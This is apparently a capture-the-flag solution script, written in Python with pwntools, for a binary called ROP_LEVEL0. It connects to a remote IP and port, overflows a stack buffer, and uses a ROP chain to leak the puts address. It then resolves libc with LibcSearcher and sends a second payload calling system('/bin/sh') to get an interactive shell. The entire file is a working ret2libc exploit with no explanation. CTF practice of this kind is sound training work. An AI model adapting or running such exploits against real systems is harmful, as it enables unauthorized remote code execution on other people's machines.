from pwn import*
from LibcSearcher import*
context.log_level = 'debug'
p = remote('47.103.214.163',20003)
#p = process('ROP_LEVEL0')
elf = ELF('ROP_LEVEL0')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
p.recvuntil('./flag')
pop_rdi_ret = 0x400753
main_addr = 0x40065B
payload = 'U'*(0x50+8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendline(payload)
p.recvline()
puts_addr = u64(p.recv(6).ljust(8,'\x00'))
log.success('Puts_Addr:\t' + hex(puts_addr))
libc = LibcSearcher('puts',puts_addr)
libcbase = puts_addr - libc.dump('puts')
system = libcbase + libc.dump('system')
binsh = libcbase + libc.dump('str_bin_sh')

p.recvuntil('./flag')
payload_II = 'U'*(0x50+8) + p64(pop_rdi_ret) + p64(binsh) + p64(system)
p.sendline(payload_II)
p.interactive()
